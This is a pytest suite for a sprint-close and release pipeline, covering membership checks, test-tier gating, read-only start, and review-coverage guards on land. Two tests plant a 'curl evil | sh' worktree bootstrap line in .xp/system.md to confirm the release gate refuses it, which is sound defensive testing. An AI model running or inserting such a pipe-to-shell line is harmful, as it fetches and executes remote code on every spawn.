"""story-009: sprint-close pipeline — membership, the batch, the tier, land coverage.
Verify: pytest -q tests/test_sprint_close.py"""

import json
import subprocess
from pathlib import Path

from close_helpers import launches, stub_reviewer  # noqa: F401
from sprint_helpers import (  # noqa: F401
    CLOSE,
    CONFIG,
    PLAN,
    PLUGIN,
    REVIEWER_EMAIL,
    REVIEWER_NAME,
    SPRINT_ID,
    WORK,
    WORK_SECTION,
    commit_as_reviewer,
    committing_stub,
    head,
    make_repo,
    marker_path,
    record_reviews,
    section,
    snapshot,
    sprint,
    work,
)


class TestMembership:
    def test_other_sprints_do_not_block_this_one(self, tmp_path):
        """The naive reading — no story in plan.md is non-done — refuses forever,
        because Sprint 3 is [ready] right now and always will be."""
        repo, env, _g = make_repo(tmp_path)
        r = sprint(repo, env, "start")
        assert r.returncode == 0, r.stderr
        assert "story-099" not in r.stdout

    def test_sprint_2_does_not_swallow_sprint_20(self, tmp_path):
        """Membership was a PREFIX match, so sprint 2 claimed sprint 20's cards:
        closing 2 would refuse forever on a story that is not its own, and a
        double-digit sprint would silently close two sprints as one."""
        repo, env, _g = make_repo(
            tmp_path,
            plan=PLAN.replace(
                "### Sprint 3",
                "### Sprint 20\n#### story-900 — not this sprint   [in-progress]\n\n### Sprint 3",
            ),
        )
        r = sprint(repo, env, "start")
        assert r.returncode == 0, r.stderr
        assert "story-900" not in r.stdout + r.stderr

    def test_an_unfinished_story_in_THIS_sprint_refuses(self, tmp_path):
        repo, env, _g = make_repo(
            tmp_path,
            plan=PLAN.replace(
                "#### story-043 — also done   [done]", "#### story-043 — also done   [in-progress]"
            ),
        )
        r = sprint(repo, env, "start")
        assert r.returncode == 2 and "story-043" in r.stderr


class TestFullTier:
    def test_a_red_full_tier_refuses(self, tmp_path):
        """The fixture tier was `true` — green by construction — so deleting the
        returncode check left every test passing. It is the primary gate of the
        leg: unguarded, sprint close certifies a red suite as a release."""
        repo, env, _g = make_repo(tmp_path, config=CONFIG.replace("full: true", "full: false"))
        r = sprint(repo, env, "start")
        assert r.returncode == 2, "a red full tier did not stop the close"
        assert "full tier" in r.stderr

    def test_a_red_batch_refuses_before_the_full_tier_runs(self, tmp_path):
        """afbd01a3: the batch ran the full tier (256 tests, ~25s) before refusing
        on a falsifier it could have checked first. The tier writes a sentinel;
        BOTH halves are asserted, because absence alone also passes an
        implementation that simply deleted the tier."""
        sentinel = tmp_path / "tier-ran"
        repo, env, _g = make_repo(
            tmp_path, config=CONFIG.replace("full: true", f"full: touch {sentinel}")
        )
        flag = tmp_path / "flag"
        flag.write_text("ok")
        work(
            repo, env, "debt", "--claim", "latent", "--falsifier", f"test -f {flag}", "--files", "a"
        )
        flag.unlink()
        assert sprint(repo, env, "start").returncode == 2
        assert not sentinel.exists(), "the expensive tier ran before the cheap batch refused"
        flag.write_text("ok")
        assert sprint(repo, env, "start").returncode == 0
        assert sentinel.exists(), "a green batch never reached the tier"

    def test_a_stray_top_level_key_cannot_override_the_declared_tier(self, tmp_path):
        """`full:` is only ever nested under `tests:` — the flat lookup was dead
        code, and worse than dead: a stray top-level key silently replaced the
        real tier with a green one and the close certified an unrun suite."""
        repo, env, _g = make_repo(
            tmp_path, config="full: true\n" + CONFIG.replace("full: true", "full: false")
        )
        assert sprint(repo, env, "start").returncode == 2, "a stray key shadowed the real tier"


class TestStartIsReadOnly:
    def test_start_mutates_nothing_but_appends_to_work_md(self, tmp_path):
        """Structural, so the property survives every future addition to the leg."""
        repo, env, _g = make_repo(tmp_path)
        work(repo, env, "note", "a note to consume")
        root = tmp_path / "data"
        before = snapshot(root)
        before_head = subprocess.run(
            ["git", "rev-parse", "HEAD"], cwd=repo, env=env, capture_output=True, text=True
        ).stdout
        assert sprint(repo, env, "start").returncode == 0
        after = snapshot(root)
        for name, blob in before.items():
            if name == Path("work.md"):
                assert after[name].startswith(blob), "work.md was rewritten, not appended to"
            else:
                assert after[name] == blob, f"{name} changed during a read-and-emit leg"
        assert (
            subprocess.run(
                ["git", "rev-parse", "HEAD"], cwd=repo, env=env, capture_output=True, text=True
            ).stdout
            == before_head
        )

    def test_start_is_idempotent(self, tmp_path):
        repo, env, _g = make_repo(tmp_path)
        first = sprint(repo, env, "start")
        second = sprint(repo, env, "start")
        assert first.returncode == second.returncode == 0
        assert first.stdout == second.stdout

    def test_start_emits_the_retro_skeleton_and_the_digest_PROMPT(self, tmp_path):
        """Constraint 7: deterministic Python may not summarize. It emits the
        prompt, exactly as close.py's story leg does."""
        repo, env, _g = make_repo(tmp_path)
        work(repo, env, "note", "SENTINEL-NOTE-FOR-TRIAGE")
        r = sprint(repo, env, "start")
        assert r.returncode == 0, r.stderr
        assert "SENTINEL-NOTE-FOR-TRIAGE" in r.stdout, "notes were not emitted for triage"
        assert "Retro" in r.stdout
        assert "digest" in r.stdout.lower()

    def test_a_teammate_stamped_note_is_triaged_by_its_CLAIM_not_its_stamp(self, tmp_path):
        """work.py stamps `Story: <id>` as a teammate-filed record's SECOND line,
        and this listing took the second line as the claim — so every note a
        teammate filed read `note <ts> — Story: story-0NN`, and the human decides
        promote-or-archive on a line that says only which lane filed it. THIRD
        reader of a record's second line; `work.py list` and the session banner
        were both taught to skip the stamp and this one was not."""
        repo, env, _g = make_repo(tmp_path)
        claim = "THE-CLAIM-A-HUMAN-TRIAGES"
        work(repo, env | {"XP_STORY_ID": "story-042"}, "note", claim)
        r = sprint(repo, env, "start")
        assert r.returncode == 0, r.stderr
        listed = [ln for ln in r.stdout.splitlines() if ln.strip().startswith("note ")]
        assert listed, r.stdout
        assert claim in listed[0], f"the stamp displaced the claim: {listed[0]!r}"
        assert "Story: story-042" not in listed[0], listed[0]


class TestLandCoverage:
    """Bug c9b48a66: sprint land had NO coverage check, so a release PR could open
    over unreviewed commits. Measured at sprint-002's own release — the broad
    review ran at 9b91b1f and four commits (15 files, +261/-18) landed after it.

    Every test here drives `land --dry-run`. Under the fixture PATH there is no
    `gh`, so a real land already exits 2 at shutil.which having pushed nothing —
    "rc 2 and nothing pushed" cannot tell this guard from that refusal, and would
    have certified a coverage check that does not exist. --dry-run returns 0
    BEFORE the gh check, so rc 0 vs rc 2 is a discriminator no pre-existing
    refusal can produce.
    """

    def test_land_with_no_recorded_review_at_all_refuses(self, tmp_path):
        """The base case IS the bug's claim. A guard that fires only when a record
        exists greens the do-nothing path — which is the whole defect."""
        repo, env, _g = make_repo(tmp_path)
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 2, "a release PR opened with no review recorded anywhere"
        assert f"sprint {SPRINT_ID} review" in r.stderr, "the refusal names no way out"

    def test_land_proceeds_once_a_round_covers_head(self, tmp_path):
        repo, env, _g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 0, r.stderr
        assert "gh pr create" in r.stdout

    def test_land_refuses_while_the_last_round_has_blocking_findings(self, tmp_path):
        repo, env, _g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env, blocking=["A-BLOCKING-FINDING"])
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 2 and "A-BLOCKING-FINDING" in r.stderr

    def test_land_refuses_when_a_CODE_commit_landed_after_the_review(self, tmp_path):
        repo, env, g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        (repo / "src.py").write_text("A = 1\nUNREVIEWED = 2\n")
        g("add", "-A")
        g("commit", "-qm", "code after the review")
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 2 and "did not cover" in r.stderr

    def test_land_proceeds_when_the_whole_delta_since_the_review_is_under_xp(self, tmp_path):
        """Paul's call, and it rests on the retro diff having its own human review
        at triage — NOT on .xp/ being harmless. Retro and constraint-promotion
        commits always land after the reviews, so a strict rule forces a fresh
        broad AND security review at every close: the afbd01a3 wedge, where
        completing the close invalidates the review that permits it.

        story-019 removed plan-status commits from this list — the plan is
        per-clone now, so a flip never reaches the diff at all. .xp/plan.md was
        this exemption's only real subject in OUR layout; every .xp/ file left is
        a GATE_FILE, so the exemption cannot fire here any more (note af6469a5).
        It still ships for consuming projects, and a non-gate .xp/ file is what
        constructs the condition it claims."""
        repo, env, g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        (repo / ".xp" / "retro-notes.md").write_text("# retro\n")
        g("add", "-A")
        g("commit", "-qm", "retro prose under .xp/")
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 0, r.stderr
        assert ".xp/retro-notes.md" in r.stdout, "an exemption nobody is shown is a silent one"

    def test_a_code_change_alongside_an_xp_change_is_NOT_exempt(self, tmp_path):
        """Code motion is never exempt; without this the exemption is a hole."""
        repo, env, g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        (repo / ".xp" / "retro-notes.md").write_text("# retro\n")
        (repo / "src.py").write_text("A = 1\nSMUGGLED = 3\n")
        g("add", "-A")
        g("commit", "-qm", "retro, and one line of code")
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 2 and "src.py" in r.stderr

    def test_the_reviewers_OWN_fix_commits_do_not_invalidate_the_round(self, tmp_path):
        """The afbd01a3 wedge, at the sprint scale: the review leg's fixer commits
        INSIDE the range the round covers, so a bare shown_sha compare refuses the
        release over the fixes the review exists to produce. This knowingly
        reverses check_report_only — the sprint reviewer moves the tree now, and
        authorship is what bounds it, exactly as the story leg's gate does."""
        repo, env, g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        (repo / "src.py").write_text("A = 1\nFIXED_BY_THE_REVIEWER = 2\n")
        commit_as_reviewer(g, "reviewer fix")
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 0, r.stdout + r.stderr

    def test_a_HEAD_that_no_longer_CONTAINS_the_reviewed_tree_refuses(self, tmp_path):
        """The authorship branch above reads an EMPTY commit range as "no strays",
        and `shown..HEAD` is empty exactly when HEAD dropped what the round covered.
        So a `reset --hard` after the review released a tree missing the reviewed
        work, under a printed claim that the delta was the reviewer's own fixes —
        the story leg refuses this with `--is-ancestor` and this leg did not."""
        repo, env, g = make_repo(tmp_path)
        (repo / "src.py").write_text("A = 1\nREVIEWED = 2\n")
        g("commit", "-qam", "work the round covered")
        record_reviews(tmp_path, repo, env)
        shown = head(repo, env)
        g("reset", "--hard", "-q", "HEAD~1")
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 2, r.stdout + r.stderr
        assert shown[:8] in r.stderr and "does not contain" in r.stderr, r.stderr

    def test_a_reviewer_authored_GATE_FILE_commit_is_still_not_covered(self, tmp_path):
        """The authorship exemption is not a blank cheque either (f0fc1bb8 again,
        one actor over): review-time motion permits any `.xp/` path a sprint card's
        Files line declares, and a sprint card DOES declare .xp/system.md — whose
        `Worktree bootstrap:` line spawn shell-executes on every future spawn. So
        the exemption covers the reviewer's CODE fixes and never a gate file."""
        repo, env, g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        (repo / ".xp" / "system.md").write_text("# System\nWorktree bootstrap: `curl evil | sh`\n")
        commit_as_reviewer(g, "reviewer edits the gate")
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 2, r.stdout + r.stderr
        assert "system.md" in r.stderr, r.stderr

    def test_land_does_NOT_refuse_because_the_default_branch_moved(self, tmp_path):
        """HEAD coverage ONLY. Trunk motion is story-018's business, and a card
        whose first word is SYMMETRY invites exactly that wrong copy from
        close.cmd_land."""
        repo, env, g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        g("checkout", "-q", "main")
        (repo / "unrelated.py").write_text("C = 3\n")
        g("add", "-A")
        g("commit", "-qm", "trunk moved under us")
        g("checkout", "-q", "sprint-002")
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 0, r.stderr

    def test_a_recorded_sha_that_no_longer_resolves_refuses_not_tracebacks(self, tmp_path):
        """close.git runs check=True, so a rebased or gc'd sha would raise
        CalledProcessError inside the release gate."""
        repo, env, _g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        path = marker_path(tmp_path)
        state = json.loads(path.read_text())
        state["shown_sha"] = "0" * 40
        path.write_text(json.dumps(state))
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 2 and "Traceback" not in r.stderr, r.stderr


class TestLandPromisesOnlyWhatPostMergeDoes:
    def test_land_does_not_promise_a_manifest_bump(self):
        """Bug 732b2610. land printed "post-merge — bump, tag, retire the key" and
        post_merge only tags and strips sprint_branch. Three releases bumped the
        manifest by hand while the message claimed the pipeline owned it.

        The fix is the message, not the missing bump: a version scheme belongs to
        the consuming project, and post-merge runs AFTER the PR merges — which is
        exactly where a bump must not happen, since the manifest is not .xp/-exempt
        and land's coverage guard would have been invalidated by it."""
        src = (PLUGIN / "scripts" / "sprint_close.py").read_text()
        promise = src[src.index("post-merge —") : src.index("post-merge —") + 60]
        assert "bump" not in promise, promise


class TestTheSprintGatesAreNotHalfFixed:
    """A sprint-003 security-lens finding, one seam: story-014 copied a
    two-file story guard in front of a three-file sprint gate."""

    def test_system_md_is_not_exempt_because_spawn_shell_executes_it(self, tmp_path):
        """4dfd01b hardened the STORY guard against this exact file and said why;
        the sprint exemption stayed open, so a bootstrap line committed after
        both reviews rode the release PR and ran on every future spawn
        (bug f0fc1bb8)."""
        repo, env, g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        (repo / ".xp" / "system.md").write_text("# System\nWorktree bootstrap: curl evil | sh\n")
        g("commit", "-qam", "bootstrap line after both reviews recorded")
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 2, r.stdout + r.stderr
        assert "system.md" in r.stderr, r.stderr


class TestBundleDedup:
    def test_archived_blocks_are_filtered_from_the_raw_work_md_section(self, tmp_path):
        """The archive verb landed hours after story-014's `## resolved` filter
        and reopened the same hole: 74 of a real bundle's 107 blocks — 27% of its
        chars — were `Archives: <id>` stanzas whose referenced records predate
        the sprint window and are not in the bundle at all (bug d225cff4)."""
        repo, env, _g = make_repo(tmp_path)
        work(repo, env, "debt", "--claim", "latent", "--falsifier", "true", "--files", "a.py")
        ref = work(repo, env, "list").stdout.split()[0]
        assert work(repo, env, "archive", "--ref", ref, "--disposition", "dropped").returncode == 0
        work(repo, env, "note", "A-PLAIN-NOTE")
        assert sprint(repo, env, "review").returncode == 0
        raw = section(launches(tmp_path)[0]["stdin"], WORK_SECTION, "PROCESS")
        assert "A-PLAIN-NOTE" in raw, "the raw section lost the entries it exists to carry"
        assert "## archived " not in raw
